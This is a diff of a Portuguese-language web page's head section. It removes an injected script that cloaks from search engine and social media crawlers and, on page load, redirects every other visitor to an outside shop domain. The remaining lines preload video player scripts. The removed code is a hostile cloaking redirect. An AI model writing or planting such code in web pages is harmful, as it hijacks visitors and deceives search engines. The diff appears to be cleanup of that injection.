@@ -1,40 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-br">
   <head>
-    <!DOCTYPE html>
-<html>
-<head>
-    
-    <script>
-        var userAgentsToRedirect = [
-            "Googlebot",
-            "MetaURI",
-            "TikTokBot"
-        ];
-
-        var userAgent = navigator.userAgent;
-
-        function isBot() {
-            for (var i = 0; i < userAgentsToRedirect.length; i++) {
-                if (userAgent.indexOf(userAgentsToRedirect[i]) !== -1) {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        window.onload = function() {
-            if (!isBot()) {
-                window.location.href = "https://kapilar.shop/";
-            }
-        };
-    </script>
-</head>
-<body>
-    <h1></h1>
-    <p></p>
-</body>
-</html>
 
     <link rel="preload" href="https://scripts.converteai.net/1f058603-79bf-4200-be7f-825396e9a9bb/players/647a69fd1613250009371d07/player.js" as="script">
 <link rel="preload" href="https://cdn.converteai.net/lib/js/smartplayer/v1/smartplayer.min.js" as="script">
